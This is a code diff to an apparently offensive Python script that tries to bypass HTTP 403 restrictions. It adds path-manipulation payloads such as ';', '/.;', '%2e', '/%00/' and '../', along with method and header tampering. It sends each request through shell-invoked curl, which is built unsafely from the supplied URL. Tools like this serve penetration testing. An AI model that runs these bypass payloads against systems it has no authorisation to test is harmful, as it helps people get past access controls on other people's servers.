@@ -2,8 +2,13 @@
 #https://github.com/blackburn27/4nought3
 import os
 import sys
+import urllib.parse
+import subprocess
 
 BLUE = '\033[34m'
+BLACK = '\033[30m'
+BLUEHIGHLIGHT = '\033[44m'
+REDHIGHLIGHT = '\033[41m'
 GREEN = '\033[32m'
 RED = '\033[31m'
 YELLOW = '\033[33m'
@@ -34,11 +39,13 @@ def host_header_injection(header, defined_url):
     if "Authenticate" in text:
         indicator = "--> AUTH"
     if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}\n")
-    elif int(status) > 299 and int(status) < 400:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
+        print(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+    elif int(status) > 299 and int(status) < 400 or int(status) == 401:
+        print(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+    elif int(status) == 403:
+        print(f"{REDHIGHLIGHT}{BLACK}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
     else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}\n")
+        print(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
 
 def http_methods(method, defined_url):
     indicator = ""
@@ -49,37 +56,50 @@ def http_methods(method, defined_url):
     if "Authenticate" in text:
         indicator = "--> AUTH"
     if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {defined_url} {YELLOW}{indicator}{RSTCOLORS}\n")
+        print(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
     elif int(status) > 299 and int(status) < 400 or int(status) == 401:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{defined_url} {YELLOW}{indicator}{RSTCOLORS}\n")
+        print(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+    elif int(status) == 403:
+        print(f"{REDHIGHLIGHT}{BLACK}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
     else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{defined_url} {YELLOW}{indicator}{RSTCOLORS}\n")
-    
-def url_injection(payload, defined_url):
-    indicator = ""
-    uri = defined_url.split("/")[-1]
-    uri = "/"+uri
+        print(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+
+def printOutput(text,payload_url):
     method = "GET"
-    remaining_url = defined_url.replace(uri, "")
-    payload_url = remaining_url+payload+uri
-    command = os.popen("curl -k -s -I '%s'" % (payload_url))
-    try:
-        text = command.read()
-        status = text.strip().split(" ")[1]
-        if "Authenticate" in text:
-            indicator = "--> AUTH"
-        if "Content-Length" not in text:
-            length = "0"
-        else:
-            length = text.strip().split(" ")[12].split()[0]
-        if int(status) == 200:
-            return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
-        elif int(status) > 299 and int(status) < 400 or int(status) == 401:
-            return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
-        else:
-            return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
-    except IndexError:
-        return ""
+    indicator = ""
+    status = text.strip().split(" ")[1]
+    #print(text)
+    if "Authenticate" in text:
+        indicator = "--> AUTH"
+    if "Content-Length" not in text:
+        length = "0"
+    else:
+        length = text.strip().split(" ")[12].split()[0]
+    if int(status) == 200:
+        print(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+    elif int(status) > 299 and int(status) < 400 or int(status) == 401:
+        print(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+    elif int(status) == 403:
+        print(f"{REDHIGHLIGHT}{BLACK}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+    else:
+        print(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+
+def url_injection(payload, defined_url):
+    parsed_url = urllib.parse.urlparse(defined_url)
+    base_url = parsed_url.scheme+"://"+parsed_url.netloc
+    uri = parsed_url.path
+    if uri.startswith("/"):
+        payload_url = base_url + "/" + payload + uri.lstrip("/")
+        command = subprocess.Popen(f"curl -k -s -I '{payload_url}'",shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        text, err = command.communicate()
+        printOutput(text.decode(),payload_url)
+    if uri.endswith("/"):
+        payload_url = base_url + uri.rstrip("/") + payload + "/"
+        command = subprocess.Popen(f"curl -k -s -I '{payload_url}'",shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        text, err = command.communicate() 
+        printOutput(text.decode(),payload_url)
+
+
 
 def url_end_injection(payload, defined_url):
     indicator = ""
@@ -141,22 +161,31 @@ else:
     print(http_methods("ACL", url),end="")
 #/////////////////////URL Injections//////////////////////////
     print(f"{BLUE}[+]Trying url injections{RSTCOLORS}")
-    print(url_injection("/;", url),end="")
-    print(url_injection(";", url),end="")
-    print(url_injection(";/", url),end="")
-    print(url_injection(";/;", url),end="")
-    print(url_injection("//", url),end="")
-    print(url_injection("/.;", url),end="")
-    print(url_injection("/%2e", url),end="")
-    print(url_injection("%2e", url),end="")
-    print(url_injection("/%00/", url),end="")
-    print(url_injection("/.;/:", url),end="")
-    print(url_injection("/;foo=bar", url),end="")
-    print(url_injection(";foo=bar", url),end="")
-    print(url_injection("/;foo=bar;", url),end="")
+    url_injection("/;", url)
+    url_injection(";", url)
+    url_injection(";/", url)
+    url_injection(";/;", url)
+    url_injection("//", url)
+    url_injection("/.;", url)
+    url_injection("/%2e", url)
+    url_injection("%2e", url)
+    url_injection("/%00/", url)
+    url_injection("./", url)
+    url_injection(".", url)
+    url_injection("../", url)
+    url_injection("..", url)
+    url_injection(";./", url)
+    url_injection("/.;/:", url)
+    url_injection("/;foo=bar", url)
+    url_injection(";foo=bar", url)
+    url_injection("/;foo=bar;", url)
+    print(url_end_injection("./", url),end="")
+    print(url_end_injection("../", url),end="")
+    print(url_end_injection(";/", url),end="")
     print(url_end_injection("%20/", url),end="") 
     print(url_end_injection("/%09/", url),end="")
-    print(url_end_injection("/%2e/", url),end="") 
+    print(url_end_injection("/%2e/", url),end="")
+    print(url_end_injection("/%00", url),end="")
     print(url_end_injection("/.", url),end="") 
     print(url_end_injection("//", url),end="")
     print(url_end_injection("/abcde/", url),end="")
